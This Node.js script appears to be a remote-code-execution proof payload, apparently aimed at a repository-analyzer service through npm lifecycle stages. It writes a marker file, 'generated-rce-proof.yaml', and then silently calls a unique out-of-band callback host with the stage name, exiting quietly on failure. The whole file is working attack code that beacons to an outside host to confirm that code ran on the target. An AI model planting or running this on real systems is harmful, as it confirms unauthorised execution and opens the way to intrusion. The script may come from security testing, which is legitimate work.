const fs = require("fs");
const https = require("https");

const stage = process.argv[2] || "unknown";
const nonce = "REPO_ANALYZER_7f3c91";

fs.writeFileSync(
  "generated-rce-proof.yaml",
  "openapi: 3.0.0\n" +
  "info:\n" +
  "  title: " + nonce + "\n" +
  "  version: 1.0.0\n" +
  "paths:\n" +
  "  /rce-proof-" + stage + ":\n" +
  "    get:\n" +
  "      responses:\n" +
  "        '200':\n" +
  "          description: proof\n"
);

const request = https.get(
  "https://ebtospyihtsca4g59mcnuftnkeq5ew8kx.testdnscoll.testlt.pl/npm-" + stage + "-7f3c91",
  response => response.resume()
);

request.on("error", () => process.exit(0));
request.setTimeout(5000, () => {
  request.destroy();
  process.exit(0);
});
